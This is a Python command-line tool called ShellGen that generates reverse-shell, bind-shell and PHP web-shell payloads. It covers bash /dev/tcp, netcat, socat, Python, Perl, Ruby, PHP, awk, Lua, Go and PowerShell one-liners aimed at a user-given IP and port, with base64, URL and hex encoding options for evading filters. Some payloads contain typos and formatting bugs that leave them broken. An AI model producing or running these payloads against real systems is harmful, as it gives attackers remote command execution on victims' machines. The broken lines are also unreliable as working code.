#!/usr/bin/python3
# Created by vay3t feat. elborikua


import argparse
import base64
import urllib.parse


def linuxRev(ipDst, portDst, shell):
    a = "%s -i >& /dev/tcp/%s/%d 0>&1" % (shell, ipDst, portDst)
    b = "socat TCP4:%s:%d EXEC:%s,pty,stderr,setsid,sigint,sane" % (
        ipDst,
        portDst,
        shell,
    )
    c = (
        'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["%s","-i"]);\''
        % (ipDst, portDst, shell)
    )
    d = (
        'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["%s","-i"]);\''
        % (ipDst, portDst, shell)
    )
    e = "127.0.0.1;%s -i >& /dev/tcp/%s/%d 0>&1" % (shell, ipDst, portDst)
    f = "0<&196;exec 196<>/dev/tcp/%s/%d; %s <&196 >&196 2>&196" % (
        ipDst,
        portDst,
        shell,
    )
    g = "exec 5<>/dev/tcp/%s/%d; while read line 0<&5; do $line 2>&5 >&5; done" % (
        ipDst,
        portDst,
    )
    h = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|nc %s %d >/tmp/f" % (
        shell,
        ipDst,
        portDst,
    )
    i = "mknod /var/tmp/fgp p ; %s 0</var/tmp/fgp |nc %s %d 1>/var/tmp/fgp" % (
        shell,
        ipDst,
        portDst,
    )
    j = (
        'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("%s -i");};\''
        % (ipDst, portDst, shell)
    )
    k = 'php -r \'$sock=fsockopen("%s",%d);exec("%s -i <&3 >&3 2>&3");\'' % (
        ipDst,
        portDst,
        shell,
    )
    l = "nc -e %s %s %d" % (shell, ipDst, portDst)
    # m = "/bin/telnet %s 80 | /bin/sh | /bin/telnet %s 25" % (ipDst, portDst)
    n = "mknod backpipe p && telnet %s %d 0<backpipe | %s 1>backpipe" % (
        ipDst,
        portDst,
        shell,
    )
    o = (
        'ruby -rsocket -e\'f=TCPSocket.open("%s",%d).to_i;exec slog.infof("%s -i <&%%d >&%%d 2>&%%d",f,f,f)\''
        % (ipDst, portDst, shell)
    )
    p = "mknod /var/tmp/fgp p ; %s 0</var/tmp/fgp |nc %s %d 1>/var/tmp/fgp" % (
        shell,
        ipDst,
        portDst,
    )
    q = (
        "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"%s:%d\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
        % (ipDst, portDst)
    )
    r = (
        'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''
        % (ipDst, portDst)
    )
    s = (
        'awk \'BEGIN {s = "/inet/tcp/0/%s>/%d"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }\}\' /dev/null'
        % (ipDst, portDst)
    )
    t = (
        "lua -e \"required('socket');required('os');t=socket.tcp();t:connect('%s','%d');os.execute('%s -i <&3 >&3 2>&3');\""
        % (ipDst, portDst, shell)
    )
    u = (
        'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%d");cmd:=exec.Command("%s");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'
        % (ipDst, portDst, shell)
    )
    return (a, b, c, d, e, f, g, h, i, j, k, l, n, o, p, q, r, s, t, u)


def windowsRev(ipDst, portDst):
    a = (
        "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
        % (ipDst, portDst)
    )
    return [a]


def linuxBind(portSrc, shell):
    a = "nc -n -l -p %d -e %s" % portSrc, shell
    b = "socat TCP-L:%d EXEC:%s" % portSrc, shell
    c = "ncat -l -p %d -e %s" % portSrc, shell
    d = (
        'python3 -c \'import socket,subprocess;socket.socket(socket.AF_INET,socket.SOCK_STREAM).bind(("0.0.0.0",%d));socket.socket().listen(1);conn,addr=socket.socket().accept();subprocess.Popen(["%s","-i"],stdin=conn,stdout=conn,stderr=conn)\''
        % (portSrc, shell)
    )
    e = (
        'python -c \'import socket,subprocess;socket.socket(socket.AF_INET,socket.SOCK_STREAM).bind(("0.0.0.0",%d));socket.socket().listen(1);conn,addr=socket.socket().accept();subprocess.Popen(["%s","-i"],stdin=conn,stdout=conn,stderr=conn)\''
        % (portSrc, shell)
    )
    f = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|nc -n -l -p %d >/tmp/f" % (
        shell,
        portSrc,
    )
    g = "mknod /var/tmp/fgp p ; %s 0</var/tmp/fgp |nc -n -l -p %d 1>/var/tmp/fgp" % (
        shell,
        portSrc,
    )

    h = (
        'ruby -rsocket -e \'f=TCPServer.new("0.0.0.0",%d).accept;exec sprintf("%s -i <&%%d >&%%d 2>&%%d",f.fileno,f.fileno,f.fileno)\''
        % (portSrc, shell)
    )
    i = (
        "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET->new(LocalPort,%d,Reuse,1,Listen)->accept;STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
        % portSrc,
    )
    j = (
        "awk 'BEGIN{s=\"/inet/tcp/0/0/%d\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
        % portSrc,
    )
    return (a, b, c, d, e, f, g, h, i, j)


def phpShells(shell):
    a = "<?php system(" + shell + ");?>"
    b = "<?php echo shell_exec(" + shell + ");?>"
    c = "<?php exec(" + shell + ",$array);print_r($array);?>"
    d = "<?php passsthru(" + shell + ");?>"
    e = "<?php preg_replace('/.*/e','system(" + shell + ");','');?>"
    f = "<?php echo `" + shell + "`;?>"
    return [a, b, c, d, e, f]


def helpEncode():
    return "Type of encoding => b64: base64, b64_utf16: base64_utf16, url: urlencode, durl: double_urlencode, hex: hexadecimal"


parser = argparse.ArgumentParser(description="ShellGen - Shells Generator")
subparsers = parser.add_subparsers(title="subcommands", dest="subcommand")


linux_rev = subparsers.add_parser("linux_rev", help="Linux reverse shells")

linux_rev.add_argument(
    "--shell",
    "-s",
    type=str,
    help="Type of shell",
    default="/bin/bash",
    dest="shellType",
)
linux_rev.add_argument(
    "--ip", "-ip", type=str, help="IP destination", required=True, dest="ipDst"
)
linux_rev.add_argument(
    "--port", "-p", type=int, help="Port destination", default=4444, dest="portDst"
)
linux_rev.add_argument("--raw", "-r", help="Raw shell", action="store_true", dest="raw")

linux_rev.add_argument(
    "--encode",
    "-e",
    dest="encode",
    type=str,
    help=helpEncode(),
    choices=["b64", "b64_utf16", "url", "durl", "hex"],
)


windows_rev = subparsers.add_parser("windows_rev", help="Windows reverse shells")

windows_rev.add_argument(
    "--ip", "-ip", type=str, help="IP destination", required=True, dest="ipDst"
)
windows_rev.add_argument(
    "--port", "-p", type=int, help="Port destination", default=4444, dest="portDst"
)
windows_rev.add_argument(
    "--raw", "-r", help="Raw shell", action="store_true", dest="raw"
)

windows_rev.add_argument(
    "--encode",
    "-e",
    dest="encode",
    type=str,
    help=helpEncode(),
    choices=["b64", "b64_utf16", "url", "durl", "hex"],
)


linux_bind = subparsers.add_parser("linux_bind", help="Linux bind shells")

linux_bind.add_argument(
    "--shell",
    "-s",
    type=str,
    help="Type of shell",
    default="/bin/bash",
    dest="shellType",
)
linux_bind.add_argument(
    "--port", "-p", type=int, help="Port source", default=4444, dest="portSrc"
)
linux_bind.add_argument(
    "--raw", "-r", help="Raw shell", action="store_true", dest="raw"
)

linux_bind.add_argument(
    "--encode",
    "-e",
    dest="encode",
    type=str,
    help=helpEncode(),
    choices=["b64", "b64_utf16", "url", "durl", "hex"],
)

php_shell = subparsers.add_parser("php_shell", help="PHP shells")

php_shell.add_argument(
    "-m",
    "--method",
    type=str,
    help="Type of method",
    choices=["request", "get", "post", "REQUEST", "GET", "POST"],
    default="request",
    dest="method",
)
php_shell.add_argument(
    "-p",
    "--parameter",
    help="Parameter ex: ?<parameter>=whoami",
    default="cmd",
    dest="parameter",
)

php_shell.add_argument("--raw", "-r", help="Raw shell", action="store_true", dest="raw")

php_shell.add_argument(
    "--encode",
    "-e",
    dest="encode",
    type=str,
    help=helpEncode(),
    choices=["b64", "b64_utf16", "url", "durl", "hex"],
)


args = parser.parse_args()

if args.subcommand == "linux_rev":
    for line in linuxRev(args.ipDst, args.portDst, args.shellType):
        if args.encode:
            match args.encode:
                case "b64":
                    line = base64.b64encode(line.encode("utf-8")).decode("utf-8")
                case "b64_utf16":
                    line = base64.b64encode(line.encode("utf-16")).decode("utf-8")
                case "url":
                    line = urllib.parse.quote(line)
                case "durl":
                    line = urllib.parse.quote(urllib.parse.quote(line))
                case "hex":
                    line = line.encode("utf-8").hex()
        if args.raw:
            print(line)
        else:
            print("[\033[1;34m*\033[0m] " + line)

if args.subcommand == "windows_rev":
    for line in windowsRev(args.ipDst, args.portDst):
        if args.encode:
            match args.encode:
                case "b64":
                    line = base64.b64encode(line.encode("utf-8")).decode("utf-8")
                case "b64_utf16":
                    line = base64.b64encode(line.encode("utf-16")).decode("utf-8")
                case "url":
                    line = urllib.parse.quote(line)
                case "durl":
                    line = urllib.parse.quote(urllib.parse.quote(line))
                case "hex":
                    line = line.encode("utf-8").hex()
        if args.raw:
            print(line)
        else:
            print("[\033[1;34m*\033[0m] " + line)

elif args.subcommand == "linux_bind":
    for line in linuxBind(args.portSrc, args.shellType):
        if args.encode:
            match args.encode:
                case "b64":
                    line = base64.b64encode(line.encode("utf-8")).decode("utf-8")
                case "b64_utf16":
                    line = base64.b64encode(line.encode("utf-16")).decode("utf-8")
                case "url":
                    line = urllib.parse.quote(line)
                case "durl":
                    line = urllib.parse.quote(urllib.parse.quote(line))
                case "hex":
                    line = line.encode("utf-8").hex()
        if args.raw:
            print(line)
        else:
            print("[\033[1;34m*\033[0m] " + line)

elif args.subcommand == "php_shell":
    prepare_global = f'$_{args.method.upper()}["{args.parameter}"]'
    for line in phpShells(prepare_global):
        if args.encode:
            match args.encode:
                case "b64":
                    line = base64.b64encode(line.encode("utf-8")).decode("utf-8")
                case "b64_utf16":
                    line = base64.b64encode(line.encode("utf-16")).decode("utf-8")
                case "url":
                    line = urllib.parse.quote(line)
                case "durl":
                    line = urllib.parse.quote(urllib.parse.quote(line))
                case "hex":
                    line = line.encode("utf-8").hex()
        if args.raw:
            print(line)
        else:
            print("[\033[1;34m*\033[0m] " + line)
